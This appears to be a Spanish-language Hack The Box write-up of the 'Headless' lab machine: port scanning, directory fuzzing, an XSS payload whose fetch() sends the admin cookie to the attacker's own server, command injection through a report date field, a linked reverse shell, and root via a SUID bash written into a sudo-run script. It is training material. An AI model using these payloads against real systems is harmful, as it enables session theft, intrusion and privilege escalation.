<h1>
    Introducción
</h1>

En esta ocasión estaremos realizando la máquina Headless de Hack The Box, estaremos tocando temas como pruebas de penetración en páginas web, Cross Site Scripting (XSS), Cookie Hijacking y escalada de privilegios. 


<h1>
    Fase de reconocimiento
</h1>

Para esta primera parte haremos los pasos de siempre:
1. Revisar si podemos hacer ping a la máquina víctima.
2. Hacer un escaneo de puertos.
3. Buscar versiones y servicios activos.

<h3>
    Haciendo ping a la máquina víctima
</h3>

![imagen](https://hackmd.io/_uploads/SJ9Uj21XA.png)

Tenemos conexión y estamos ante una máquina Linux (por el ttl con proximidad a 64)

<h3>
    Escaneando puertos con sus versiones y servicios
</h3>

Encontramos los siguientes puertos abiertos y podemos quedarnos con la siguiente información más importante:

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
5000/tcp open  upnp?   syn-ack ttl 63
```

Ahora revisamos el puerto 5000:
![imagen](https://hackmd.io/_uploads/SJx9ahyQR.png)

<h2>
    Explorando la web
</h2>

Al entrar a la web vemos lo siguiente:


![imagen](https://hackmd.io/_uploads/r1OT6hkQA.png)

Ahora trataremos de hallar ficheros y directorios ocultos en la página (fuzzing) con el siguiente comando:

`gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .html,.php,.txt`
![imagen](https://hackmd.io/_uploads/H14ZtmB70.png)


Entramos al directorio `dashboard`:
![imagen](https://hackmd.io/_uploads/ByaaP7HmA.png)
No tenemos permiso para entrar a la página, pero encontramos algo curioso en las cookies:

![imagen](https://hackmd.io/_uploads/S1f4dQrQR.png)

La página valida la cookie de sesión, por tanto, necesitamos tener una cookie de administrador para poder acceder a la página.
Por ahora continuamos con la recopilación de información.

<h1>
    Explotación de XSS y Cookie Hijacking
</h1>

De igual forma hallamos el directorio`support`, al entrar nos encontramos con lo siguiente:
![imagen](https://hackmd.io/_uploads/By-ifQB7C.png)

Aquí podemos intentar responder con cualquier dato para ver la respuesta, pero antes de enviar la solicitud, la interceptaremos con BurpSuite:

Seleccionamos nuestra extensión de `FoxyProxy` previamente configurada:
![imagen](https://hackmd.io/_uploads/HJiOQmSX0.png)

Encendemos la intercepeción en BurpSuite:
![imagen](https://hackmd.io/_uploads/Bk8h77BXR.png)

Y finalmente enviamos la solicitud desde la página web con el botón `submit` en la página web.

Obtenemos una respuesta en BurpSuite, misma que enviaremos a la sección`Repeater` (con las teclas Ctrl + R):
![imagen](https://hackmd.io/_uploads/r1C-47r7C.png)

Desde el Repeater, enviamos la solicitud con el botón `Send` y en la respuesta (panel derecho), seleccionamos `Render`
![imagen](https://hackmd.io/_uploads/SkFKNmHm0.png)

Probamos con un intento de Cross Site Site Scripting (XSS) básico, escribiendo `<script>alert("XSS");</script>` en la sección "message": 
![imagen](https://hackmd.io/_uploads/rJkYHQBQC.png)

Y obtenemos:
![imagen](https://hackmd.io/_uploads/rJGmUXHQC.png)
La página detecta cuando intentamos inyectar código malicioso, por tanto intentaremos modificar el código malicioso a inyectar:


Usamos el siguiente código en la sección `message` y el `user agent` desde BurpSuite:
```
<img src=x onerror=fetch('http://10.10.14.158:80/'+document.cookie);>
```
Solo hace falta cambiar la IP por la del lector.

Antes de enviar la solicitud, montamos un servidor web con python por el puerto 80 donde recibiremos la solicitud:

```
python -m http.server 80
```
![imagen](https://hackmd.io/_uploads/rkfqroTXA.png)



Enviamos la solicitud con el user agent y message modificados:
![imagen](https://hackmd.io/_uploads/rkV2No67A.png)


Obtenemos la cookie de administrador:
![imagen](https://hackmd.io/_uploads/BySuEsTXA.png)


Regresamos a la página dashboard e inspeccionamos la página para modificar las cookies que obtuvimos:

![imagen](https://hackmd.io/_uploads/SJa8UiTQ0.png)
![imagen](https://hackmd.io/_uploads/H1YaDsp7A.png)

Cambiamos la cookies que vienen por defecto:
![imagen](https://hackmd.io/_uploads/S1uxdsTm0.png)

Recargamos la página:

![imagen](https://hackmd.io/_uploads/HyUzOja70.png)
¡Entramos a la página!

Volvemos a activar el FoxyProxy y BurpSuite y enviamos un reporte con el botón `Generate Report`:

![imagen](https://hackmd.io/_uploads/Hkf1Fi6XA.png)

Ya que la máquina es Linux y vemos una función de generar reporte, podemos probar con otros comandos desde el Repeater de BurpSuite:

`date=2023-09-15; ls -la`

![imagen](https://hackmd.io/_uploads/BkcpYi67R.png)

Ahora probamos a enviarnos una Reverse Shell:

Vamos a seguir los pasos que tenemos en el repositorio del Club:

https://github.com/Greco140/Club-de-Ciberseguridad-UADY-FMAT/blob/main/CTFs/Ayuda/Shell%20reverse/Shell%20reverse%20con%20python.md

Luego enviamos la Reverse Shell desde la página web:

![imagen](https://hackmd.io/_uploads/H1Wb6jTQA.png)

![imagen](https://hackmd.io/_uploads/BJJ4Tia7C.png)
¡Estamos dentro!


Si retrocedemos un directorio estamos en el directorio `/home/dvir` y encontramos el fichero `user.txt` que contiene la flag del usuario:

![imagen](https://hackmd.io/_uploads/ryy7CjT7A.png)


<h1>
     Escalada de privilegios
</h1>

Primeramente intentamos usar el comando `sudo -l` y leemos el fichero `syscheck`:

![imagen](https://hackmd.io/_uploads/BkRKAop7R.png)

Leyendo el código vemos que inicia el fichero `initdb.sh` que se encuentra en `/home/dvir/app`:

![imagen](https://hackmd.io/_uploads/ryOUJ3amR.png)

Incluiremos el comando `chmod u+s /bin/bash` dentro de `initdb.sh` de la siguiente forma:
`echo "chmod u+s /bin/bash" > initdb.sh`

Luego ejecutamos el fichero `syscheck` con: 
`sudo /usr/bin/syscheck` 
se ejecuta con permisos de superusuario, lo cual es crucial porque necesitamos que initdb.sh se ejecute con permisos elevados para que el comando chmod u+s /bin/bash sea efectivo.

Luego
`bash -p` inicia una nueva instancia de bash preservando los privilegios del propietario del ejecutable, en este caso, root.

Finalmente:
`whoami`
`cat root/root.txt`

![imagen](https://hackmd.io/_uploads/BJwtlhaQR.png)

El funcionamiento detrás de esto es que al podemos ejecutar el fichero `/usr/bin/syscheck` como superusuario (sudo), además podemos agregar líneas de código.
Ya que dentro del fichero `/usr/bin/syscheck` se ejecuta el fichero `initdb.sh`, se desencadena el contenido de `initdb.sh`, es decir una bash que conserva los privilegios de sudo, esto por medio de los permisos SUID de una bash que agregamos previamente a `initdb.sh`
Una vez ejecutado el fichero `/usr/bin/syscheck` podemos ejecutar la bash con 
`bash -p` y somos usuario root.

Espero te haya gustado y aprendido algo nuevo con esta máquina :D.


